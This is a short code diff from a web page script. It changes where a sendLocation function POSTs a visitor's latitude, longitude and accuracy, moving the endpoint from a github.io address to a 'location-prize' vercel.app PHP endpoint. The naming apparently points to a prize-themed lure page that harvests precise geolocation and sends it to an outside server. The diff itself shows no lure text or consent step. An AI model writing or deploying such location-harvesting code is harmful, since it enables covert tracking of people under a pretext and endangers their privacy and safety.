@@ -51,7 +51,7 @@
     const statusDiv = document.getElementById("status");
 
     function sendLocation(lat, lon, acc) {
-      fetch("https://kkjjnihao.github.io/location-prize/send-location.php", {
+      fetch("https://location-prize.vercel.app/send-location.php", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc })
